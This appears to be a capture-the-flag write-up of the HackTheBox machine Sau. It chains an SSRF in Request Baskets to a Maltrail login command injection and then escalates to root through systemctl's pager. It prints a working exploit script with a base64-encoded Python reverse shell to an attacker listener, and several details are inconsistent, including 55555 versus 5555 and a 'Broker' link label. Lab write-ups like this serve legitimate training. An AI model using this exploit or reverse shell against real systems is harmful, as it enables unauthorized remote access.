---
title: "HackTheBox: Sau"
collection: publications
permalink: /publication/sau
excerpt: 'This is a retired machine from HackTheBox'
date: 2023-12-08
venue: '12-08'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/sau_header.png)

**LINK:** [Broker](https://app.hackthebox.com/machines/Sau)

Sau is an easy machine on HackTheBox that presents an interesting path to compromise through multiple vulnerabilities. The initial foothold is gained by exploiting an SSRF in an outdated version of the requests-basket HTTP server. This SSRF vulnerability reveals an internally accessible application, Maltrail v0.53, running on port 80. Leveraging a Remote Code Execution vulnerability in Maltrail provides unauthorized access to the machine. Executing systemctl as puma allows us to spawn another shell in the pager with root privileges.

---

## Enumeration : 

* Let's start off with an nmap scan :

```bash
nmap -A -p- 10.10.11.224
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-08 05:47 EST
Nmap scan report for 10.10.11.224
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
```

* The scan reveals 2 open ports and 1 filtered port:
    - Port 22: SSH service
    - Port 80: HTTP server (filtered)
    - Port 5555: Unknown service

* Visiting port 5555 redirects to ``http://10.10.11.224:5555/web``, There, I stumbled upon a web service called "Request Baskets" running version 1.2.1. It seemed interesting because I could create baskets, send requests, and see the data.

![sau1](/images/sau1.png)

* A quick Google search exposed an SSRF vulnerability (CVE-2023–27163) in this version.

![sau2](/images/sau2.png)

* Now, here's where things got intriguing. I decided to exploit the SSRF vulnerability to redirect internal requests on the server to Port 80. I edited the configuration settings to forward requests to ``http://127.0.0.1:80`` .

![sau3](/images/sau3.png)

* After applying the changes, I discovered the "Maltrail" app running on Port 80, version v0.53. A bit more digging revealed an RCE vulnerability in this version.

![sau4](/images/sau4.png)

![sau5](/images/sau5.png)

# User Flag : 

* Exploiting this RCE vulnerability involved creating a basket using the previous CVE to redirect to Maltrail's login page at ``http://127.0.0.1:80/login`` .

* To get a reverse shell, I set up a netcat listener.

![sau6](/images/sau6.png)

* Now it's time to execute the python script to get the reverse shell.

```bash
import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

```bash
python3 exploit.py <your-ip-address> <listening-port> http://10.10.11.224:5555/<Basket-name>
```
![sau7](/images/sau7.png)

* I got a user shell as the ``puma`` user.

![sau8](/images/sau8.png)

# Root Flag : 

* Now, moving on to privilege escalation part, I ran ``sudo -l`` and found that I could execute ``systemctl`` as the root user.

![sau9](/images/sau9.png)

* Checking the status of ``trail.service`` with ``systemctl``, I noticed the output was processed through ``less`` providing an opportunity to spawn a shell as the root user using ``!sh``.

![sau10](/images/sau10.png)

# Conclusion : 

Sau offers a diverse range of challenges, from exploiting an initial ``SSRF`` in an outdated requests-basket to leveraging a ``RCE`` in the internal Maltrail application. The machine's design emphasizes the importance of thorough enumeration and persistence in identifying and exploiting multiple vulnerabilities. Privilege escalation, though straightforward, highlights the significance of analyzing user privileges to achieve root access.






